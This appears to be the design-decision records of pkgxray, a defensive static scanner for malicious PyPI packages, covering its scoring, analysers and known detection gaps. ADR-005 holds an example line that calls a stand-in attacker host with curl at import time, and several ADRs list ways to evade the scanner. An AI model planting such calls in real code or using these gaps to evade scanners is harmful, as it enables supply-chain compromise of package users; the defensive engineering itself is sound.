# Architecture Decision Records — pkgxray

ADRs document significant design decisions: what was decided, why, and what the trade-offs are. Update this file when a decision changes.

**Format:** Each ADR has a status (`Accepted` | `Superseded` | `Proposed`) and a date.

---

## ADR-001: Static AST Analysis — No Code Execution

**Status:** Accepted
**Date:** 2024 (initial design)

### Decision
All analysis is performed via `ast.parse()` on the raw source text. The package under analysis is never imported, executed, or installed.

### Rationale
- Executing arbitrary third-party code is the threat model we are defending against. Running the code to analyse it would be self-defeating.
- `ast.parse()` is safe: it parses syntax only, never evaluates semantics.
- The only network activity is the PyPI metadata fetch and archive download — both using `urllib` from the stdlib.

### Consequences
- We can only detect patterns that are visible in source code (not in compiled `.so`/`.pyd` extensions).
- Packages that gate malicious behaviour behind runtime conditions can evade detection.
- Aliased names (`import subprocess as sp`) are not tracked across statements.

---

## ADR-002: urllib-Only HTTP Client

**Status:** Accepted
**Date:** 2024 (initial design)

### Decision
`downloader.py` uses only `urllib.request` from the Python standard library. No `requests`, `httpx`, or other third-party HTTP libraries.

### Rationale
- Minimises the dependency surface of a security tool. Adding `requests` would mean pkgxray itself is subject to the same supply-chain risks it analyses.
- `urllib` is sufficient for the two API calls needed (PyPI JSON endpoint + archive download).

### Consequences
- No retry logic, connection pooling, or timeout configuration beyond what `urllib` exposes.
- SSL certificate verification relies on the system's default CA bundle via `urllib`.
- Adding proxy support or custom TLS would require more verbose code.

---

## ADR-003: Fail-Open Per Analyser

**Status:** Accepted
**Date:** 2024 (initial design)

### Decision
Every `analyzer.analyze()` call in the orchestrator is wrapped in `try/except Exception: continue`. A crash in one analyser never aborts the rest of the scan.

### Rationale
- A maliciously crafted package that exploits a bug in one analyser should not be able to suppress findings from the other seven.
- A parse error in an unusual Python file (e.g. using Python 3.13+ syntax on a 3.9 runner) should degrade gracefully, not crash the tool.

### Consequences
- Analyser bugs are silently swallowed unless tests catch them.
- There is currently no telemetry or logging when an analyser fails — failures are invisible in production.
- Future improvement: log analyser failures at DEBUG level.

---

## ADR-004: Two-Level Score Capping with Per-Analyser Caps and Combo Bonuses

**Status:** Accepted
**Date:** 2025 (v0.3.0 recalibration)

### Decision

The risk score uses three layers of control:

1. **Per-analyser caps (variable):** Each analyser has its own ceiling based on how often it fires on legitimate packages.
2. **Combo bonuses:** When multiple high-risk categories appear together with ≥ HIGH severity, a bonus is added to reflect combined danger (e.g. reading credentials AND making a network call).
3. **Global cap (100 points):** Total score is clamped to 100.

Severity weights (unchanged): LOW=1, MEDIUM=3, HIGH=7, CRITICAL=15.

**Per-analyser caps (v0.3.0):**

| Analyser | Cap | Rationale |
|---|---|---|
| `obfuscation` | 20 | exec(b64decode) — almost never legitimate |
| `setup_scripts` | 20 | Install hooks — high-confidence attack vector |
| `code_exec` | 15 | eval/exec — suspicious but used in templating |
| `subprocess` | 12 | Common in build tools and CLI wrappers |
| `filesystem` | 12 | Destructive ops + sensitive paths |
| `network` | 8 | Normal for HTTP libraries |
| `dynamic_imports` | 6 | Used in legitimate plugin systems |
| `env_access` | 5 | Ubiquitous in CLI tools and 12-factor apps |

**Risk level thresholds (v0.3.0):**

| Score | Level |
|---|---|
| 0 – 15 | LOW |
| 16 – 35 | MODERATE |
| 36 – 60 | HIGH |
| 61 – 100 | CRITICAL |

**Combo bonuses (v0.3.0):**

| Combo | Bonus | Meaning |
|---|---|---|
| `env_access` + `network` | +15 | Credential exfiltration pattern |
| `network` + `subprocess` | +10 | Download and execute pattern |
| `obfuscation` + `code_exec` | +20 | Obfuscated payload pattern |
| `setup_scripts` + `subprocess` | +10 | Install hook with shell commands |

Combo bonuses only fire when both analysers have at least one HIGH-severity finding, preventing legitimate packages from triggering them.

### Rationale

The original single cap of 20 across all analysers was too permissive: any package touching 5+ analysers at any severity reached CRITICAL. Empirical baseline scans showed:
- `requests` (legitimate HTTP library) was scoring HIGH due to network + env + filesystem findings.
- `click` (CLI framework) was scoring HIGH due to env + subprocess findings.

Per-analyser caps reduce the weight of frequently-firing low-risk patterns (env reads, network calls) without discarding the information entirely. High-confidence analysers (`obfuscation`, `setup_scripts`) retain higher ceilings.

Combo bonuses add signal for multi-category packages: a package that BOTH exfiltrates credentials AND makes network calls is more dangerous than the sum of either alone.

### Consequences

- `requests` → MODERATE (~31); `click` → MODERATE (~29); `more-itertools` → LOW (~0).
- A package with `exec(b64decode(...))` + install hook + module-level subprocess → CRITICAL.
- Caps and thresholds should be re-evaluated after Phase 2 analyser fixes (false-positive reductions) are merged, as those will change raw finding counts.

---

## ADR-005: Severity Escalation at Module Level

**Status:** Accepted — known gap
**Date:** 2024 (initial design)

### Decision
Any dangerous call (subprocess, network, code execution) that appears at the top level of a module (outside any function or class) is automatically escalated to `CRITICAL` severity, regardless of its base severity.

### Rationale
- Module-level code runs automatically when the package is imported, requiring no further user action beyond installation.
- This is the canonical attack pattern in PyPI supply-chain attacks: placing `subprocess.run(["curl", ...])` at the top of `__init__.py`.

### Known Gap
`is_module_level()` walks upward through parent nodes and returns `False` if any ancestor is a `ClassDef`. This means code in a class body (but outside a method) is NOT classified as module-level, even though it executes when the class is defined at import time.

```python
class Foo:
    subprocess.run(["curl", "http://evil.com"])  # runs at import time, but scored as HIGH not CRITICAL
```

### Proposed Fix
Modify `is_module_level()` to treat class-body code as module-level (i.e. only return `False` for `FunctionDef` and `AsyncFunctionDef` ancestors, not `ClassDef`).

---

## ADR-006: Docker as the Canonical Test Environment

**Status:** Accepted
**Date:** 2025 (v0.2.x)

### Decision
All tests in CI run inside Docker. The Docker image is the single source of truth for the test environment. Local development should also use `docker compose run test` for PR validation.

### Rationale
- The team uses different local Python versions. Docker ensures everyone and CI runs the same interpreter.
- The Dockerfile pins `python:3.11-slim` as the primary test target, with the CI matrix also covering 3.9 and 3.12.
- Reproducibility: a test that passes in Docker will pass in CI.

### Consequences
- Slower first run (image build). Subsequent runs use Docker's layer cache.
- Developers need Docker installed. Lightweight alternatives (e.g. podman) are compatible.
- Integration tests that download real packages from PyPI require network access in the Docker container.

---

## ADR-007: Receiver-Name-Based False-Positive Mitigation

**Status:** Accepted — partially effective
**Date:** 2024 (initial design)

### Decision
Analysers that detect method calls check the *receiver* object's name before flagging. For example, `NetworkAnalyzer` only flags `.get()` calls when the receiver is in `{"requests", "httpx", "session", "client", ...}`, preventing `dict.get()` and `config.get()` from being flagged.

### Rationale
- Pure regex scanning produces an unacceptable number of false positives for common method names.
- The AST gives us the receiver as an `ast.Name` node, which we can inspect.

### Known Limitation
Receiver identification only works when the receiver is a direct `ast.Name` node (a simple variable name). If the receiver is a chained attribute access (e.g., `self.session.get(...)`), `func.value` is an `ast.Attribute`, not `ast.Name`, so `receiver` becomes an empty string and the call is **not** flagged.

This means OOP-style HTTP clients are systematically missed by `NetworkAnalyzer`. See `docs/QUANTA.md` for the full issue.

### Proposed Fix
Recurse into `ast.Attribute` chains to extract the final attribute name as a secondary receiver candidate, or check `func.attr` (the method name) independently with a wider allow-list.
